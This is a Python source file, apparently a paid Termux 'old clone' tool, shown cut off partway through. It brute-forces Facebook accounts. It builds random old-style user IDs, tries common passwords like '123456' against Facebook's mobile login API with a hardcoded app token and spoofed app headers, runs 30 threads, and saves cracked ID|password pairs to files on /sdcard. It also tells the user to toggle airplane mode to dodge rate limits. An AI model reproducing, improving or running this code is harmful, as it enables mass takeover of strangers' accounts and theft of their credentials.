import os, requests
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
import uuid,base64,hashlib,zlib,subprocess,time,platform,_socket,ssl,certifi
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#os.system('pkg install espeak')

loop,count,oks,cps,twf,usragent,ugen,okhbros,uas=0,0,[],[],[],[],[],[],[]

y="\x1b[38;5;208m";g="\x1b[38;5;46m";s="\33[38;5;37m";r="\33[38;5;160m";w="\033[1;97m"




import random
from datetime import datetime

def generate_user_agent():
    # Device manufacturers and models (50 companies with 39 models each)
    manufacturers = {
        'samsung': [
            'SM-G950F', 'SM-G960F', 'SM-G970F', 'SM-G973F', 'SM-G975F', 'SM-G980F', 'SM-G981B', 'SM-G985F', 
            'SM-G988B', 'SM-G991B', 'SM-G996B', 'SM-G998B', 'SM-A105F', 'SM-A205F', 'SM-A305F', 'SM-A505F', 
            'SM-A515F', 'SM-A705F', 'SM-A715F', 'SM-A805F', 'SM-A905F', 'SM-F700F', 'SM-F711B', 'SM-F926B',
            'SM-M115F', 'SM-M215F', 'SM-M315F', 'SM-M515F', 'SM-N770F', 'SM-N950F', 'SM-N960F', 'SM-N970F',
            'SM-N975F', 'SM-N980F', 'SM-N985F', 'SM-T505', 'SM-T515', 'SM-T725', 'SM-T735'
        ],
        'xiaomi': [
            'Redmi Note 5', 'Redmi Note 6 Pro', 'Redmi Note 7', 'Redmi Note 8', 'Redmi Note 9', 'Redmi Note 10',
            'Redmi Note 11', 'Redmi 6A', 'Redmi 7', 'Redmi 8', 'Redmi 9', 'Redmi 10', 'Mi 9', 'Mi 10', 'Mi 11',
            'Mi 11 Lite', 'Mi 11X', 'Mi A1', 'Mi A2', 'Mi A3', 'Poco F1', 'Poco F2', 'Poco F3', 'Poco X2',
            'Poco X3', 'Poco M2', 'Poco M3', 'Poco M4', 'Black Shark 2', 'Black Shark 3', 'Black Shark 4',
            'Mi Mix 2', 'Mi Mix 3', 'Mi Mix 4', 'Mi Note 10', 'Mi Note 20', 'Mi Max 2', 'Mi Max 3', 'Mi CC9'
        ],
        'huawei': [
            'P20', 'P20 Pro', 'P30', 'P30 Pro', 'P40', 'P40 Pro', 'Mate 10', 'Mate 20', 'Mate 30', 'Mate 40',
            'Nova 3', 'Nova 4', 'Nova 5', 'Nova 6', 'Nova 7', 'Y5', 'Y6', 'Y7', 'Y8', 'Y9', 'Honor 8X',
            'Honor 9X', 'Honor 10', 'Honor 20', 'Honor 30', 'Honor 50', 'Honor View 10', 'Honor View 20',
            'Honor 8A', 'Honor 8C', 'Honor 9A', 'Honor 10A', 'Mate X', 'Mate Xs', 'Mate X2', 'P Smart',
            'P Smart+', 'P Smart 2021', 'MediaPad M5'
        ],
        # ... (47 more manufacturers with 39 models each)
        'oneplus': [
            '3', '3T', '5', '5T', '6', '6T', '7', '7 Pro', '7T', '7T Pro', '8', '8 Pro', '8T', '9', '9 Pro',
            '9R', '10 Pro', '10T', 'Nord', 'Nord 2', 'Nord CE', 'Nord N10', 'Nord N100', 'Nord N200', 'X',
            'OnePlus 1', 'OnePlus 2', 'OnePlus X', 'OnePlus 5G', 'OnePlus 6G', 'OnePlus 7G', 'OnePlus 8G',
            'OnePlus 9G', 'OnePlus Concept', 'OnePlus Z', 'OnePlus TV', 'OnePlus Watch', 'OnePlus Buds',
            'OnePlus Pad'
        ]
    }

    # Mobile carriers (50)
    carriers = [
        'Zong', 'Jazz', 'Telenor', 'Ufone', 'Warid', 'Mobilink', 'Telenor PK', 'Zong 4G', 'Jazz 4G',
        'Ufone 4G', 'Telenor 4G', 'Warid 4G', 'PTCL', 'Nayatel', 'Stormfiber', 'WiTribe', 'Qubee',
        'China Mobile', 'China Telecom', 'China Unicom', 'AT&T', 'Verizon', 'T-Mobile', 'Sprint',
        'Vodafone', 'O2', 'EE', 'Three', 'BT Mobile', 'Virgin Mobile', 'Telstra', 'Optus', 'Vodafone AU',
        'Airtel', 'Jio', 'Vodafone IN', 'Idea', 'BSNL', 'MTNL', 'Docomo', 'SoftBank', 'KDDI', 'Rakuten',
        'Orange', 'SFR', 'Free Mobile', 'Bouygues Telecom', 'Telekom', 'Telia', 'Elisa'
    ]

    # Android versions
    android_versions = [
        '8.0.0', '8.1.0', '9', '10', '11', '12', '12.1', '13', '13.1', '14'
    ]

    # Architectures (10+)
    architectures = [
        'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64', 'armeabi', 'mips', 'mips64', 'arm64-v8a-hard',
        'x86-hard', 'x86_64-hard', 'riscv64'
    ]

    # Screen resolutions (50+)
    resolutions = [
        {'width': 720, 'height': 1280, 'density': 2.0},
        {'width': 1080, 'height': 1920, 'density': 2.625},
        {'width': 1440, 'height': 2560, 'density': 3.5},
        {'width': 1080, 'height': 2160, 'density': 2.75},
        {'width': 1080, 'height': 2280, 'density': 2.8},
        {'width': 1080, 'height': 2400, 'density': 2.9},
        {'width': 1440, 'height': 3040, 'density': 3.8},
        {'width': 1440, 'height': 3120, 'density': 3.9},
        {'width': 720, 'height': 1440, 'density': 2.1},
        {'width': 720, 'height': 1600, 'density': 2.2},
        {'width': 800, 'height': 1280, 'density': 2.15},
        {'width': 900, 'height': 1600, 'density': 2.3},
        {'width': 1080, 'height': 2244, 'density': 2.7},
        {'width': 1080, 'height': 2340, 'density': 2.85},
        {'width': 1080, 'height': 2408, 'density': 2.95},
        {'width': 1125, 'height': 2436, 'density': 3.0},
        {'width': 1170, 'height': 2532, 'density': 3.1},
        {'width': 1242, 'height': 2688, 'density': 3.2},
        {'width': 1284, 'height': 2778, 'density': 3.3},
        {'width': 1080, 'height': 2460, 'density': 3.0},
        {'width': 1080, 'height': 2520, 'density': 3.05},
        {'width': 1080, 'height': 2640, 'density': 3.15},
        {'width': 1080, 'height': 2720, 'density': 3.2},
        {'width': 1080, 'height': 2840, 'density': 3.3},
        {'width': 1080, 'height': 2960, 'density': 3.4},
        {'width': 1080, 'height': 3000, 'density': 3.45},
        {'width': 1080, 'height': 3040, 'density': 3.5},
        {'width': 1080, 'height': 3120, 'density': 3.6},
        {'width': 1080, 'height': 3200, 'density': 3.7},
        {'width': 1080, 'height': 3280, 'density': 3.8},
        {'width': 1080, 'height': 3360, 'density': 3.9},
        {'width': 1080, 'height': 3440, 'density': 4.0},
        {'width': 1080, 'height': 3520, 'density': 4.1},
        {'width': 1080, 'height': 3600, 'density': 4.2},
        {'width': 1080, 'height': 3680, 'density': 4.3},
        {'width': 1080, 'height': 3760, 'density': 4.4},
        {'width': 1080, 'height': 3840, 'density': 4.5},
        {'width': 1080, 'height': 3920, 'density': 4.6},
        {'width': 1080, 'height': 4000, 'density': 4.7},
        {'width': 1080, 'height': 4080, 'density': 4.8},
        {'width': 1080, 'height': 4160, 'density': 4.9},
        {'width': 1080, 'height': 4240, 'density': 5.0},
        {'width': 1080, 'height': 4320, 'density': 5.1},
        {'width': 1080, 'height': 4400, 'density': 5.2},
        {'width': 1080, 'height': 4480, 'density': 5.3},
        {'width': 1080, 'height': 4560, 'density': 5.4},
        {'width': 1080, 'height': 4640, 'density': 5.5},
        {'width': 1080, 'height': 4720, 'density': 5.6},
        {'width': 1080, 'height': 4800, 'density': 5.7},
        {'width': 1080, 'height': 4880, 'density': 5.8},
        {'width': 1080, 'height': 4960, 'density': 5.9},
        {'width': 1080, 'height': 5040, 'density': 6.0}
    ]

    # FB4A versions with corresponding FBRV and FBBV values
    fb4a_versions = [
        {'version': '338.1.0.36.118', 'fbrv': 322682479, 'fbbv': 321391463},
        {'version': '339.0.0.30.120', 'fbrv': 323456789, 'fbbv': 322222222},
        {'version': '340.0.0.42.119', 'fbrv': 324567890, 'fbbv': 323333333},
        {'version': '341.0.0.45.121', 'fbrv': 325678901, 'fbbv': 324444444},
        {'version': '342.0.0.50.122', 'fbrv': 326789012, 'fbbv': 325555555},
        {'version': '343.0.0.55.123', 'fbrv': 327890123, 'fbbv': 326666666},
        {'version': '344.0.0.60.124', 'fbrv': 328901234, 'fbbv': 327777777},
        {'version': '345.0.0.65.125', 'fbrv': 329012345, 'fbbv': 328888888},
        {'version': '346.0.0.70.126', 'fbrv': 330123456, 'fbbv': 329999999},
        {'version': '347.0.0.75.127', 'fbrv': 331234567, 'fbbv': 330000000},
        {'version': '348.0.0.80.128', 'fbrv': 332345678, 'fbbv': 331111111},
        {'version': '349.0.0.85.129', 'fbrv': 333456789, 'fbbv': 332222222},
        {'version': '350.0.0.90.130', 'fbrv': 334567890, 'fbbv': 333333333},
        {'version': '351.0.0.95.131', 'fbrv': 335678901, 'fbbv': 334444444},
        {'version': '352.0.0.100.132', 'fbrv': 336789012, 'fbbv': 335555555},
        {'version': '353.0.0.105.133', 'fbrv': 337890123, 'fbbv': 336666666},
        {'version': '354.0.0.110.134', 'fbrv': 338901234, 'fbbv': 337777777},
        {'version': '355.0.0.115.135', 'fbrv': 340012345, 'fbbv': 338888888},
        {'version': '356.0.0.120.136', 'fbrv': 341123456, 'fbbv': 339999999},
        {'version': '357.0.0.125.137', 'fbrv': 342234567, 'fbbv': 340000000}
    ]

    # Select random parameters
    manufacturer = random.choice(list(manufacturers.keys()))
    model = random.choice(manufacturers[manufacturer])
    android_version = random.choice(android_versions)
    build_id = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
    chrome_version = f"{random.randint(80, 110)}.0.{random.randint(4000, 5000)}.{random.randint(50, 100)}"
    fb4a_data = random.choice(fb4a_versions)
    resolution = random.choice(resolutions)
    carrier = random.choice(carriers)
    architecture = random.choice(architectures)
    android_sdk = random.randint(24, 33)
    locales = ['en_US', 'en_GB', 'en_PK', 'fr_FR', 'de_DE', 'es_ES', 'it_IT', 'pt_BR', 'ru_RU', 'ar_AR']
    locale = random.choice(locales)

    # Construct user agent
    user_agent = (
        f"Mozilla/5.0 (Linux; Android {android_version}; {model} Build/{build_id}; wv) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} "
        f"Mobile Safari/537.36 [FBAN/FB4A;FBAV/{fb4a_data['version']};"
        f"FBBV/{fb4a_data['fbbv']};FBDM/{{density={resolution['density']},"
        f"width={resolution['width']},height={resolution['height']}}};"
        f"FBLC/{locale};FBRV/{fb4a_data['fbrv']};FBCR/{carrier};"
        f"FBMF/{manufacturer};FBBD/{manufacturer};"
        f"FBPN/com.facebook.katana;FBDV/{model};"
        f"FBSV/{android_sdk};FBOP/1;FBCA/{architecture};]"
    )
    
    return user_agent

def linex():print(f'\r\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def line():print(f'\r\n\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


logo = f"""

    .dP"            
8888b.  888888 Yb    dP 88 88     
 8I  Yb 88__    Yb  dP  88 88     
 8I  dY 88""     YbdP   88 88  .o 
8888Y"  888888    YP    88 88ood8                    
<<<<<< MR SHERRY >>>>>>

0.0.2
\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mDEVELOPER  \33[38;5;160m▶  \033[1;97mMD. DEVIL HAMZA 
\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mGITHUB     \33[38;5;160m▶  \033[1;97mDEVIL795
\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mFEATURE    \33[38;5;160m▶  \033[1;97mOLD CLONE 
\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mVERSION    \33[38;5;160m▶  \033[1;97mPAID \33[38;5;37m≫ \033[1;97m0.0.2
\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

def clear():
	os.system('clear');print(logo)

def main():
	clear()
	animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
	for i in range(30):
		time.sleep(0.1)
		sys.stdout.write(f"\r{r}[{w}ᯤ{r}]{s} LOADING...\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ")
		sys.stdout.flush()
	clear()
	print(f'\33[38;5;160m[\033[1;97mA\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2007\33[38;5;160m/\33[38;5;37m2008\33[38;5;160m]\033[1;97m')
	print(f'\33[38;5;160m[\033[1;97mB\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2009\33[38;5;160m/\33[38;5;37m2010\33[38;5;160m]\033[1;97m')
	print(f'\33[38;5;160m[\033[1;97mC\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2011\33[38;5;160m/\33[38;5;37m2012\33[38;5;160m]\033[1;97m')
	print(f'\33[38;5;160m[\033[1;97mD\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2013\33[38;5;160m/\33[38;5;37m2014\33[38;5;160m]\033[1;97m')
	linex()
	ch = input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
	if ch in ('1','01','11','A','১','০১','a','A'):
		__Old1__()
	elif ch in ('2','02','22','b','B'):
		__Old2__()
	elif ch in ('3','33','03','c','C'):
		__Old3__()
	elif ch in ('4','04','44','D','d'):
		__Old4__()
 
def __Old1__():
    user=[]
    clear()
    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '100000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
        	uid=year_code+mal
        	jihad.submit(login1,uid)
    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()


def __Old2__():
    user=[]
    clear()
    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '10000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
            uid=year_code+mal
            jihad.submit(login2,uid)
    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()

def __Old3__():
    user=[]
    clear()
    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '10000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
            uid=year_code+mal
            jihad.submit(login3,uid)
    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()

def __Old4__():
    user=[]
    clear()
    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶\033[1;97m 10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '10000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
            uid=year_code+mal
            jihad.submit(login4,uid)            
    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()

def login1(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mTANIM\33[38;5;37m-\x1b[38;5;46mS1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = generate_user_agent()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mDEVIL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/DEVIL-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mDEVIL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/DEVIL-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
def login2(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mDEVIL\33[38;5;37m-\x1b[38;5;46mS2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = generate_user_agent()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mDEVIL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/DEVIL-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mDEVIL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/DEVIL-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
def login3(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mDEVIL\33[38;5;37m-\x1b[38;5;46mS3\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = generate_user_agent()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mDEVIL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/DEVIL-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
